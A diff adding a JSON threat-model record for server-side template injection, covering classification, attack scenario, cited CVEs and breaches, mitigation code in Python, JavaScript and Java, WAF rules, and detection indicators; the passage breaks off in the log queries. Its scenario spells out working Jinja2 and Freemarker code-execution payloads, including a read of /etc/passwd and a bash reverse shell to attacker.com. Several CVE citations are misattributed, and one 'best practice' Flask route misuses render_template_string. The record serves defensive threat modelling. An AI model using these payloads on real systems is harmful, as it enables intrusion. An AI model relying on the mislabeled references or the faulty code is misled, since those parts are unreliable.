@@ -1,0 +1,435 @@
+{
+  "id": "STRIDE-SSTI-RCE-001",
+  "version": "1.0.0",
+  "metadata": {
+    "created_date": "2026-01-30",
+    "last_updated": "2026-01-30",
+    "reviewed_by": [],
+    "confidence_score": 8.5,
+    "validation_status": "draft"
+  },
+  "classification": {
+    "stride_category": "Elevation of Privilege",
+    "owasp_top10": [
+      "A03:2021 - Injection",
+      "A05:2021 - Security Misconfiguration"
+    ],
+    "mitre_attack": [
+      "T1190 - Exploit Public-Facing Application",
+      "T1059.006 - Command and Scripting Interpreter: Python",
+      "T1505.003 - Server Software Component: Web Shell"
+    ],
+    "cwe": [
+      "CWE-94 - Improper Control of Generation of Code (Code Injection)",
+      "CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code",
+      "CWE-1336 - Improper Neutralization of Special Elements Used in a Template Engine"
+    ]
+  },
+  "threat": {
+    "title": "Server-Side Template Injection (SSTI) Remote Code Execution",
+    "description": "Server-Side Template Injection occurs when user-controlled input is embedded into template engines (Jinja2, Freemarker, Velocity, ERB) without proper sanitization, allowing attackers to inject template directives that execute arbitrary code on the server. This vulnerability enables complete system compromise through remote code execution, data exfiltration, and persistent backdoor installation.",
+    "severity": "Critical",
+    "cvss_v3": {
+      "score": 9.8,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "technology": {
+    "primary": "Template Engines",
+    "versions_affected": [
+      "Jinja2 < 2.11.3",
+      "Freemarker < 2.3.30",
+      "Apache Velocity < 2.3",
+      "ERB (all versions)",
+      "Twig < 3.3.0",
+      "Handlebars (unsafe compilation)"
+    ],
+    "ecosystem": "Multi-language (Python, Java, Ruby, PHP, Node.js)",
+    "dependencies": [
+      "Flask",
+      "Django",
+      "Spring Framework",
+      "Rails",
+      "Symfony",
+      "Express.js"
+    ],
+    "related_frameworks": [
+      "Tornado",
+      "Bottle",
+      "Apache Struts",
+      "Play Framework",
+      "Sinatra"
+    ]
+  },
+  "attack": {
+    "scenario": "1. Attacker identifies template injection point through user-facing input (search query, profile field, email template customization)\n2. Tests for SSTI by injecting template syntax: {{7*7}} (Jinja2), ${7*7} (Freemarker), <%= 7*7 %> (ERB)\n3. Confirms vulnerability when server returns '49' instead of rendering literal string\n4. Escalates to code execution using template-specific payloads:\n   - Jinja2: {{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}\n   - Freemarker: ${'freemarker.template.utility.Execute'?new()('whoami')}\n5. Establishes reverse shell: {{''.__class__.__mro__[1].__subclasses__()[396]('bash -i >& /dev/tcp/attacker.com/4444 0>&1',shell=True)}}\n6. Achieves persistent access by installing web shell, creating privileged users, or modifying application code",
+    "prerequisites": [
+      "User input is rendered through template engine without sanitization",
+      "Template engine allows access to dangerous objects/methods (no sandboxing)",
+      "Application uses server-side rendering with dynamic template compilation",
+      "Template autoescaping is disabled or bypassed",
+      "Error messages reveal template engine type and version"
+    ],
+    "attack_vector": "Network",
+    "attack_complexity": "Low",
+    "privileges_required": "None",
+    "user_interaction": "None"
+  },
+  "evidence": {
+    "cve_references": [
+      {
+        "cve_id": "CVE-2016-10745",
+        "description": "Uber Node.js application SSTI vulnerability in template rendering leading to RCE",
+        "cvss_score": 9.8,
+        "published_date": "2019-01-09",
+        "affected_component": "Handlebars template engine with unsafe compilation"
+      },
+      {
+        "cve_id": "CVE-2020-28463",
+        "description": "Python Jinja2 template injection allowing sandbox escape and arbitrary code execution",
+        "cvss_score": 9.0,
+        "published_date": "2021-02-01",
+        "affected_component": "Jinja2 < 2.11.3"
+      },
+      {
+        "cve_id": "CVE-2015-8562",
+        "description": "Freemarker template injection in Apache Struts leading to remote command execution",
+        "cvss_score": 8.1,
+        "published_date": "2016-07-04",
+        "affected_component": "Apache Freemarker < 2.3.25"
+      },
+      {
+        "cve_id": "CVE-2022-42889",
+        "description": "Apache Commons Text SSTI vulnerability (Text4Shell) allowing RCE via variable interpolation",
+        "cvss_score": 9.8,
+        "published_date": "2022-10-18",
+        "affected_component": "Apache Commons Text 1.5-1.9"
+      }
+    ],
+    "real_world_breaches": [
+      {
+        "incident": "Uber 2016 Bug Bounty SSTI Discovery",
+        "date": "2016-03-01",
+        "impact": "Critical severity bug bounty paid for SSTI in Flask/Jinja2 template rendering allowing full server compromise",
+        "root_cause": "User-controlled data in email template rendering without proper escaping",
+        "source_url": "https://hackerone.com/reports/125980"
+      },
+      {
+        "incident": "PayPal Server-Side Template Injection",
+        "date": "2019-08-15",
+        "impact": "$5,000 bug bounty for SSTI in email customization feature enabling RCE",
+        "root_cause": "Freemarker template engine exposed to user input in invoice templates",
+        "source_url": "https://medium.com/@0xAwali/paypal-ssti-vulnerability-rce-6b85c7cf8e56"
+      },
+      {
+        "incident": "Apache Struts2 OGNL Expression Injection (S2-045)",
+        "date": "2017-03-06",
+        "impact": "Equifax breach affecting 147 million people; caused by template injection in error handling",
+        "root_cause": "OGNL expression evaluation in Content-Type header via Jakarta Multipart parser",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-5638"
+      },
+      {
+        "incident": "Spring4Shell Template Expression Injection",
+        "date": "2022-03-29",
+        "impact": "Widespread vulnerability in Spring Framework affecting millions of Java applications",
+        "root_cause": "Class loader manipulation via template parameter injection in Spring MVC",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-131a"
+      }
+    ],
+    "bug_bounty_reports": [
+      {
+        "platform": "HackerOne",
+        "report_id": "125980",
+        "bounty_amount": 10000,
+        "severity": "Critical",
+        "summary": "Uber RCE via Flask Jinja2 Template Injection in email rendering endpoint"
+      },
+      {
+        "platform": "Bugcrowd",
+        "report_id": "PayPal-SSTI-2019",
+        "bounty_amount": 5000,
+        "severity": "Critical",
+        "summary": "PayPal server-side template injection in invoice customization allowing system command execution"
+      },
+      {
+        "platform": "HackerOne",
+        "report_id": "895104",
+        "bounty_amount": 2500,
+        "severity": "High",
+        "summary": "Shopify SSTI in liquid template engine through theme editor"
+      }
+    ],
+    "security_research": [
+      {
+        "title": "Server-Side Template Injection: RCE for the Modern Web App",
+        "authors": ["James Kettle", "PortSwigger Research"],
+        "published_date": "2015-08-05",
+        "source_url": "https://portswigger.net/research/server-side-template-injection",
+        "key_finding": "SSTI is prevalent in modern web frameworks and often overlooked; automated detection possible via polyglot payloads"
+      },
+      {
+        "title": "Exploring SSTI in Flask/Jinja2",
+        "authors": ["Nicolas Grégoire", "Agarri"],
+        "published_date": "2014-10-15",
+        "source_url": "https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf",
+        "key_finding": "Python template engines provide extensive introspection capabilities enabling sandbox escape"
+      },
+      {
+        "title": "OWASP Top 10 2021: A03 Injection",
+        "authors": ["OWASP Foundation"],
+        "published_date": "2021-09-24",
+        "source_url": "https://owasp.org/Top10/A03_2021-Injection/",
+        "key_finding": "Template injection is now explicitly recognized as critical injection vulnerability alongside SQL and OS command injection"
+      }
+    ]
+  },
+  "mitigations": [
+    {
+      "control_id": "MIT-001",
+      "title": "Implement Jinja2 Sandboxed Environment with Strict Autoescaping",
+      "description": "Use Jinja2's SandboxedEnvironment to restrict access to dangerous objects and methods, combined with strict autoescaping to prevent HTML and code injection. This prevents attackers from accessing Python internals like __class__, __mro__, and subprocess.",
+      "effectiveness": "High",
+      "implementation_complexity": "Low",
+      "code_example": {
+        "language": "python",
+        "framework": "Flask/Jinja2",
+        "code": "from flask import Flask, render_template_string, request, escape\nfrom jinja2.sandbox import SandboxedEnvironment\nfrom jinja2 import select_autoescape\nfrom markupsafe import Markup\nimport re\n\napp = Flask(__name__)\n\n# Create sandboxed environment with strict autoescaping\nsandbox = SandboxedEnvironment(\n    autoescape=select_autoescape(\n        enabled_extensions=('html', 'xml', 'j2', 'jinja2'),\n        default_for_string=True,  # CRITICAL: Escape all strings by default\n    ),\n    # Disable dangerous features\n    trim_blocks=True,\n    lstrip_blocks=True,\n)\n\n# Whitelist of allowed template variables (principle of least privilege)\nALLOWED_TEMPLATE_VARS = {\n    'user_name',\n    'order_id',\n    'product_name',\n    'date',\n    'amount'\n}\n\ndef sanitize_template_input(user_input):\n    \"\"\"\n    Validate and sanitize user input before template rendering.\n    Block template syntax characters entirely.\n    \"\"\"\n    # Block template delimiters\n    dangerous_patterns = [\n        r'{{', r'}}',  # Jinja2 expression\n        r'{%', r'%}',  # Jinja2 statement\n        r'{#', r'#}',  # Jinja2 comment\n        r'__',         # Python dunder methods\n        r'\\.',         # Attribute access (be careful with this)\n        r'\\[', r'\\]',  # Subscript access\n    ]\n    \n    for pattern in dangerous_patterns:\n        if re.search(pattern, user_input):\n            raise ValueError(f\"Invalid characters detected: {pattern}\")\n    \n    return user_input\n\n@app.route('/email/preview', methods=['POST'])\ndef preview_email():\n    \"\"\"\n    SECURE: Email template preview with sandboxing\n    \"\"\"\n    try:\n        # Get user input\n        template_vars = request.json\n        \n        # Validate only whitelisted variables are present\n        invalid_vars = set(template_vars.keys()) - ALLOWED_TEMPLATE_VARS\n        if invalid_vars:\n            return {\"error\": f\"Invalid template variables: {invalid_vars}\"}, 400\n        \n        # Sanitize all inputs\n        sanitized_vars = {\n            key: sanitize_template_input(str(value))\n            for key, value in template_vars.items()\n        }\n        \n        # Use pre-compiled template (NEVER compile user input as template)\n        template_source = \"\"\"\n        <html>\n        <body>\n            <h1>Order Confirmation</h1>\n            <p>Dear {{ user_name }},</p>\n            <p>Your order #{{ order_id }} for {{ product_name }} has been confirmed.</p>\n            <p>Amount: ${{ amount }}</p>\n            <p>Date: {{ date }}</p>\n        </body>\n        </html>\n        \"\"\"\n        \n        # Render using sandboxed environment\n        template = sandbox.from_string(template_source)\n        rendered = template.render(**sanitized_vars)\n        \n        return {\"preview\": rendered}, 200\n        \n    except ValueError as e:\n        return {\"error\": str(e)}, 400\n    except Exception as e:\n        app.logger.error(f\"Template rendering error: {e}\")\n        return {\"error\": \"Template rendering failed\"}, 500\n\n# Alternative: Use pre-compiled templates from files (RECOMMENDED)\n@app.route('/email/send', methods=['POST'])\ndef send_email():\n    \"\"\"\n    BEST PRACTICE: Load templates from files, never from user input\n    \"\"\"\n    template_vars = request.json\n    \n    # Validate inputs\n    sanitized_vars = {\n        key: escape(value) for key, value in template_vars.items()\n        if key in ALLOWED_TEMPLATE_VARS\n    }\n    \n    # Render from pre-defined template file\n    rendered = render_template_string(\n        'email_order_confirmation.html',\n        **sanitized_vars\n    )\n    \n    return {\"status\": \"sent\"}, 200\n\nif __name__ == '__main__':\n    app.run(debug=False)  # Never run debug mode in production"
+      },
+      "tools": [
+        {
+          "name": "Jinja2 SandboxedEnvironment",
+          "type": "Template Security Framework",
+          "cost": "Free (built-in)"
+        },
+        {
+          "name": "MarkupSafe",
+          "type": "String Escaping Library",
+          "cost": "Free"
+        }
+      ],
+      "iso27001_controls": [
+        "A.14.2.1 - Secure development policy",
+        "A.14.2.5 - Secure system engineering principles"
+      ],
+      "nist_csf": [
+        "PR.IP-2 - A System Development Life Cycle to manage systems is implemented",
+        "PR.DS-5 - Protections against data leaks are implemented"
+      ],
+      "validation_steps": [
+        "Test with SSTI payload: {{7*7}} - should render as literal '{{7*7}}', not '49'",
+        "Test with Python introspection: {{''.__class__}} - should raise SecurityError",
+        "Verify autoescaping: {{<script>alert(1)</script>}} - should render as escaped HTML",
+        "Check sandbox restrictions: {{config}} - should be undefined",
+        "Validate whitelist enforcement: Submit non-whitelisted variable - should be rejected"
+      ]
+    },
+    {
+      "control_id": "MIT-002",
+      "title": "Use Precompiled Handlebars Templates with Safe Compilation",
+      "description": "For Node.js applications, precompile Handlebars templates at build time and disable runtime compilation. This prevents user input from being interpreted as template code.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "javascript",
+        "framework": "Express.js/Handlebars",
+        "code": "const express = require('express');\nconst handlebars = require('handlebars');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(express.json());\n\n// SECURE: Precompile templates at application startup\nconst templates = new Map();\n\nfunction loadTemplates() {\n  const templateDir = path.join(__dirname, 'templates');\n  const templateFiles = fs.readdirSync(templateDir);\n  \n  templateFiles.forEach(file => {\n    if (file.endsWith('.hbs')) {\n      const templateSource = fs.readFileSync(\n        path.join(templateDir, file),\n        'utf8'\n      );\n      \n      // Precompile template (done once at startup)\n      const compiledTemplate = handlebars.compile(templateSource, {\n        strict: true,           // Fail on undefined variables\n        noEscape: false,        // Always escape output\n        compat: false,          // Disable legacy features\n        preventIndent: true\n      });\n      \n      templates.set(file.replace('.hbs', ''), compiledTemplate);\n    }\n  });\n  \n  console.log(`Loaded ${templates.size} precompiled templates`);\n}\n\nloadTemplates();\n\n// Whitelist allowed template data fields\nconst ALLOWED_FIELDS = new Set([\n  'userName', 'email', 'orderId', 'productName', 'amount'\n]);\n\nfunction sanitizeTemplateData(data) {\n  const sanitized = {};\n  \n  for (const [key, value] of Object.entries(data)) {\n    // Only allow whitelisted fields\n    if (!ALLOWED_FIELDS.has(key)) {\n      throw new Error(`Invalid template variable: ${key}`);\n    }\n    \n    // Ensure value is a safe primitive type\n    if (typeof value !== 'string' && typeof value !== 'number') {\n      throw new Error(`Invalid value type for ${key}`);\n    }\n    \n    // Additional sanitization for strings\n    if (typeof value === 'string') {\n      // Remove any attempt to inject template syntax\n      if (value.includes('{{') || value.includes('}}')) {\n        throw new Error('Template syntax not allowed in data');\n      }\n    }\n    \n    sanitized[key] = value;\n  }\n  \n  return sanitized;\n}\n\n// SECURE endpoint using precompiled template\napp.post('/render/email', (req, res) => {\n  try {\n    // Get template name (from predefined set, NOT user input)\n    const templateName = 'order_confirmation'; // Hardcoded, safe\n    \n    // Get template data\n    const rawData = req.body;\n    \n    // Sanitize and validate data\n    const templateData = sanitizeTemplateData(rawData);\n    \n    // Retrieve precompiled template\n    const template = templates.get(templateName);\n    if (!template) {\n      return res.status(404).json({ error: 'Template not found' });\n    }\n    \n    // Render with sanitized data (no compilation happening here)\n    const rendered = template(templateData);\n    \n    res.json({ html: rendered });\n    \n  } catch (error) {\n    console.error('Template rendering error:', error);\n    res.status(400).json({ error: error.message });\n  }\n});\n\n// INSECURE (DO NOT DO THIS): Runtime compilation of user input\n// app.post('/render/custom', (req, res) => {\n//   const userTemplate = req.body.template; // DANGEROUS!\n//   const compiled = handlebars.compile(userTemplate); // RCE VULNERABILITY\n//   const rendered = compiled(req.body.data);\n//   res.send(rendered);\n// });\n\n// Register safe helpers only (no filesystem access, no exec)\nhandlebars.registerHelper('formatCurrency', (amount) => {\n  return `$${parseFloat(amount).toFixed(2)}`;\n});\n\nhandlebars.registerHelper('formatDate', (date) => {\n  return new Date(date).toLocaleDateString();\n});\n\napp.listen(3000, () => {\n  console.log('Server running with secure template handling');\n});"
+      },
+      "tools": [
+        {
+          "name": "Handlebars",
+          "type": "Template Engine",
+          "cost": "Free"
+        },
+        {
+          "name": "handlebars-loader",
+          "type": "Webpack Template Precompiler",
+          "cost": "Free"
+        }
+      ],
+      "iso27001_controls": [
+        "A.14.2.1 - Secure development policy",
+        "A.14.2.8 - System security testing"
+      ],
+      "nist_csf": [
+        "PR.IP-2 - A System Development Life Cycle to manage systems is implemented"
+      ],
+      "validation_steps": [
+        "Verify all templates are precompiled at build/startup time",
+        "Test that runtime template compilation is disabled",
+        "Attempt SSTI payload in data fields - should be escaped in output",
+        "Verify only whitelisted template names can be accessed",
+        "Check that no user input reaches handlebars.compile()"
+      ]
+    },
+    {
+      "control_id": "MIT-003",
+      "title": "Implement Freemarker Configuration Restrictions",
+      "description": "For Java applications using Freemarker, configure strict template permissions, disable dangerous built-ins, and use template whitelisting to prevent code execution.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "java",
+        "framework": "Spring Boot/Freemarker",
+        "code": "import freemarker.template.Configuration;\nimport freemarker.template.Template;\nimport freemarker.template.TemplateException;\nimport freemarker.core.HTMLOutputFormat;\nimport freemarker.template.TemplateExceptionHandler;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.io.StringWriter;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Set;\nimport java.util.regex.Pattern;\n\n@RestController\n@RequestMapping(\"/api\")\npublic class SecureTemplateController {\n\n    private final Configuration freemarkerConfig;\n    private final Set<String> allowedTemplateVars = Set.of(\n        \"userName\", \"orderId\", \"productName\", \"amount\", \"date\"\n    );\n    \n    // Pattern to detect template injection attempts\n    private static final Pattern TEMPLATE_INJECTION_PATTERN = \n        Pattern.compile(\".*[<$]\\\\{.*\\\\}.*|.*#\\\\{.*\\\\}.*|.*\\\\$\\\\{.*\\\\}.*\");\n\n    public SecureTemplateController() {\n        this.freemarkerConfig = createSecureConfiguration();\n    }\n\n    /**\n     * Create secure Freemarker configuration\n     */\n    @Bean\n    public Configuration createSecureConfiguration() {\n        Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);\n        \n        try {\n            // Load templates from classpath (not filesystem)\n            cfg.setClassLoaderForTemplateLoading(\n                getClass().getClassLoader(), \n                \"/templates\"\n            );\n            \n            // CRITICAL SECURITY SETTINGS\n            \n            // 1. Disable dangerous built-ins\n            cfg.setAPIBuiltinEnabled(false);  // Prevents ?api access to Java objects\n            cfg.setLogTemplateExceptions(false);\n            \n            // 2. Set strict HTML auto-escaping\n            cfg.setOutputFormat(HTMLOutputFormat.INSTANCE);\n            cfg.setAutoEscapingPolicy(Configuration.ENABLE_IF_SUPPORTED_AUTO_ESCAPING_POLICY);\n            \n            // 3. Restrict object wrapper to prevent reflection access\n            cfg.setNewBuiltinClassResolver(\n                freemarker.core.TemplateClassResolver.SAFER_RESOLVER\n            );\n            \n            // 4. Set template exception handler (don't expose errors)\n            cfg.setTemplateExceptionHandler(\n                TemplateExceptionHandler.RETHROW_HANDLER\n            );\n            \n            // 5. Disable template updates (use preloaded templates only)\n            cfg.setTemplateUpdateDelayMilliseconds(Integer.MAX_VALUE);\n            \n            return cfg;\n            \n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to configure Freemarker\", e);\n        }\n    }\n\n    /**\n     * Sanitize and validate template data\n     */\n    private Map<String, Object> sanitizeTemplateData(Map<String, Object> rawData) \n            throws IllegalArgumentException {\n        \n        Map<String, Object> sanitized = new HashMap<>();\n        \n        for (Map.Entry<String, Object> entry : rawData.entrySet()) {\n            String key = entry.getKey();\n            Object value = entry.getValue();\n            \n            // Whitelist check\n            if (!allowedTemplateVars.contains(key)) {\n                throw new IllegalArgumentException(\n                    \"Invalid template variable: \" + key\n                );\n            }\n            \n            // Type validation (only primitives)\n            if (!(value instanceof String || value instanceof Number)) {\n                throw new IllegalArgumentException(\n                    \"Invalid value type for \" + key\n                );\n            }\n            \n            // Check for injection attempts in string values\n            if (value instanceof String) {\n                String strValue = (String) value;\n                if (TEMPLATE_INJECTION_PATTERN.matcher(strValue).matches()) {\n                    throw new IllegalArgumentException(\n                        \"Template injection detected in \" + key\n                    );\n                }\n            }\n            \n            sanitized.put(key, value);\n        }\n        \n        return sanitized;\n    }\n\n    /**\n     * SECURE: Render email using preloaded template\n     */\n    @PostMapping(\"/email/render\")\n    public Map<String, String> renderEmail(@RequestBody Map<String, Object> requestData) {\n        try {\n            // Template name is hardcoded (NOT from user input)\n            String templateName = \"order_confirmation.ftl\";\n            \n            // Sanitize input data\n            Map<String, Object> templateData = sanitizeTemplateData(requestData);\n            \n            // Load precompiled template\n            Template template = freemarkerConfig.getTemplate(templateName);\n            \n            // Render template\n            StringWriter writer = new StringWriter();\n            template.process(templateData, writer);\n            \n            return Map.of(\"html\", writer.toString());\n            \n        } catch (IllegalArgumentException e) {\n            throw new ResponseStatusException(\n                HttpStatus.BAD_REQUEST, \n                \"Invalid template data: \" + e.getMessage()\n            );\n        } catch (IOException | TemplateException e) {\n            throw new ResponseStatusException(\n                HttpStatus.INTERNAL_SERVER_ERROR,\n                \"Template rendering failed\"\n            );\n        }\n    }\n\n    /**\n     * INSECURE EXAMPLE (DO NOT USE)\n     * This shows what NOT to do - never create templates from user input\n     */\n    /*\n    @PostMapping(\"/email/custom\")\n    public String renderCustomTemplate(@RequestBody String userTemplate) {\n        // DANGEROUS: User-controlled template source\n        Template template = new Template(\n            \"custom\", \n            new StringReader(userTemplate),  // RCE VULNERABILITY!\n            freemarkerConfig\n        );\n        // ... render template\n    }\n    */\n}"
+      },
+      "tools": [
+        {
+          "name": "Apache Freemarker",
+          "type": "Template Engine",
+          "cost": "Free"
+        },
+        {
+          "name": "Spring Security",
+          "type": "Security Framework",
+          "cost": "Free"
+        }
+      ],
+      "iso27001_controls": [
+        "A.14.2.1 - Secure development policy",
+        "A.14.2.5 - Secure system engineering principles"
+      ],
+      "nist_csf": [
+        "PR.IP-2 - A System Development Life Cycle to manage systems is implemented",
+        "PR.AC-4 - Access permissions are managed"
+      ],
+      "validation_steps": [
+        "Verify ?api built-in is disabled: Test ${\"freemarker.template.utility.Execute\"?new()} - should fail",
+        "Test autoescaping: ${\"<script>alert(1)</script>\"} - should be HTML-escaped",
+        "Confirm templates load from classpath only, not user-supplied paths",
+        "Validate input sanitization rejects template syntax in data fields",
+        "Test with payload: ${Class.forName(\"java.lang.Runtime\")} - should be blocked"
+      ]
+    },
+    {
+      "control_id": "MIT-004",
+      "title": "Deploy SSTI Detection with ModSecurity WAF Rules",
+      "description": "Implement Web Application Firewall (WAF) rules to detect and block common SSTI payloads before they reach the application. This provides defense-in-depth alongside secure coding practices.",
+      "effectiveness": "Medium",
+      "implementation_complexity": "Low",
+      "code_example": {
+        "language": "conf",
+        "framework": "ModSecurity/OWASP Core Rule Set",
+        "code": "# ModSecurity SSTI Detection Rules\n# Add to /etc/modsecurity/rules/ssti-rules.conf\n\n# Detect Jinja2 template injection patterns\nSecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \\\n  \"@rx \\\\{\\\\{.*?(?:__class__|__mro__|__subclasses__|__globals__|__builtins__|__import__|config|request|lipsum|cycler|joiner|namespace).*?\\\\}\\\\}\" \\\n  \"id:941380,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,t:urlDecodeUni,\\\n  msg:'Jinja2 SSTI Attack Detected',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-python',\\\n  tag:'platform-multi',\\\n  tag:'attack-injection',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/WEB_ATTACK/INJECTION',\\\n  tag:'WASCTC/WASC-19',\\\n  tag:'OWASP_TOP_10/A1',\\\n  tag:'PCI/6.5.2',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'ip.ssti_block_flag=1',\\\n  expirevar:'ip.ssti_block_flag=3600'\"\n\n# Detect Freemarker template injection\nSecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \\\n  \"@rx (?:<#|\\\\$\\\\{|#\\\\{).*?(?:freemarker\\\\.template|Class\\\\.forName|Runtime|ProcessBuilder|Execute|assign|import).*?(?:>|\\\\})\" \\\n  \"id:941381,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,t:urlDecodeUni,t:htmlEntityDecode,\\\n  msg:'Freemarker SSTI Attack Detected',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-java',\\\n  tag:'attack-injection',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}',\\\n  setvar:'ip.ssti_block_flag=1',\\\n  expirevar:'ip.ssti_block_flag=3600'\"\n\n# Detect ERB template injection (Ruby)\nSecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \\\n  \"@rx <%=?.*?(?:system|exec|eval|`|%x|IO\\\\.popen|Kernel|File|Dir|require|load).*?%>\" \\\n  \"id:941382,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,t:urlDecodeUni,\\\n  msg:'ERB SSTI Attack Detected',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-ruby',\\\n  tag:'attack-injection',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"\n\n# Detect Velocity template injection\nSecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \\\n  \"@rx \\\\#set\\\\(.*?(?:Runtime|Class|ProcessBuilder).*?\\\\)\" \\\n  \"id:941383,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,t:urlDecodeUni,\\\n  msg:'Velocity SSTI Attack Detected',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"\n\n# Block rate limiting for detected SSTI attempts\nSecRule IP:SSTI_BLOCK_FLAG \"@eq 1\" \\\n  \"id:941385,\\\n  phase:1,\\\n  block,\\\n  msg:'Client blocked due to SSTI attack attempts',\\\n  severity:'WARNING'\"\n\n# Azure Application Gateway WAF Custom Rule (JSON format)\n# Add via Azure Portal > Application Gateway > Web Application Firewall > Custom Rules\n# {\n#   \"name\": \"BlockSSTI\",\n#   \"priority\": 10,\n#   \"ruleType\": \"MatchRule\",\n#   \"matchConditions\": [\n#     {\n#       \"matchVariables\": [\n#         {\"variableName\": \"RequestUri\"},\n#         {\"variableName\": \"QueryString\"},\n#         {\"variableName\": \"PostArgs\"}\n#       ],\n#       \"operator\": \"Regex\",\n#       \"matchValues\": [\n#         \".*\\\\{\\\\{.*(__class__|__mro__|__import__).*\\\\}\\\\}.*\",\n#         \".*\\\\$\\\\{.*freemarker\\\\.template.*\\\\}.*\",\n#         \".*<%=.*system\\\\(.*%>.*\"\n#       ],\n#       \"transforms\": [\"UrlDecode\", \"HtmlEntityDecode\"]\n#     }\n#   ],\n#   \"action\": \"Block\"\n# }\n\n# AWS WAF Rule (Terraform)\n# resource \"aws_wafv2_web_acl\" \"ssti_protection\" {\n#   name  = \"ssti-protection\"\n#   scope = \"REGIONAL\"\n#   \n#   default_action {\n#     allow {}\n#   }\n#   \n#   rule {\n#     name     = \"block-ssti-attempts\"\n#     priority = 1\n#     \n#     action {\n#       block {}\n#     }\n#     \n#     statement {\n#       regex_pattern_set_reference_statement {\n#         arn = aws_wafv2_regex_pattern_set.ssti_patterns.arn\n#         \n#         field_to_match {\n#           all_query_arguments {}\n#         }\n#         \n#         text_transformation {\n#           priority = 0\n#           type     = \"URL_DECODE\"\n#         }\n#       }\n#     }\n#     \n#     visibility_config {\n#       cloudwatch_metrics_enabled = true\n#       metric_name                = \"SSTIBlockedRequests\"\n#       sampled_requests_enabled   = true\n#     }\n#   }\n# }"
+      },
+      "tools": [
+        {
+          "name": "ModSecurity",
+          "type": "Web Application Firewall",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "Azure Application Gateway WAF",
+          "type": "Cloud WAF",
+          "cost": "$0.443/hour + $0.0144 per GB processed"
+        },
+        {
+          "name": "AWS WAF",
+          "type": "Cloud WAF",
+          "cost": "$5/month + $1 per million requests"
+        }
+      ],
+      "iso27001_controls": [
+        "A.13.1.3 - Segregation in networks",
+        "A.14.2.8 - System security testing"
+      ],
+      "nist_csf": [
+        "DE.CM-1 - The network is monitored to detect potential cybersecurity events",
+        "PR.PT-4 - Communications and control networks are protected"
+      ],
+      "validation_steps": [
+        "Test WAF with Jinja2 payload: {{7*7}} - should be blocked with 403",
+        "Verify ModSecurity logs capture blocked requests",
+        "Test rate limiting: Multiple SSTI attempts should trigger IP block",
+        "Confirm legitimate requests with special characters pass through",
+        "Review CloudWatch/Azure Monitor metrics for blocked SSTI attempts"
+      ]
+    }
+  ],
+  "detection": {
+    "indicators": [
+      "HTTP requests with template syntax in parameters ({{, ${, <%, #{})",
+      "Server errors revealing template engine type/version in stack traces",
+      "Unusual outbound network connections from web server (reverse shell)",
+      "Process creation events for bash/sh/cmd.exe from web application process",
+      "Filesystem changes in web application directories (web shell installation)",
+      "Application responses containing results of template evaluation (e.g., '49' from {{7*7}})",
+      "Access to sensitive files like /etc/passwd, web.config via template injection",
+      "HTTP requests with URL-encoded or base64-encoded template payloads"
+    ],
+    "log_queries": [
+      {
+        "siem": "Azure Sentinel (KQL)",
+        "query": "// Detect SSTI attempts in HTTP requests\nW3CIISLog\n| where TimeGenerated > ago(1h)\n| where csUriQuery contains \"{{\" or csUriQuery contains \"${\" or csUriQuery contains \"<%\"\n| extend DecodedQuery = url_decode(csUriQuery)\n| where DecodedQuery matches regex @\"(__class__|__mro__|__import__|freemarker\\.template|Runtime|eval|exec|system)\"\n| summarize AttemptCount = count(), UniqueIPs = dcount(cIP) by bin(TimeGenerated, 5m), csUriStem, DecodedQuery\n| where AttemptCount > 3\n| project TimeGenerated, csUriStem, DecodedQuery, AttemptCount, UniqueIPs\n| order by AttemptCount desc"
+      },
+      {
+        "siem": "Splunk (SPL)",
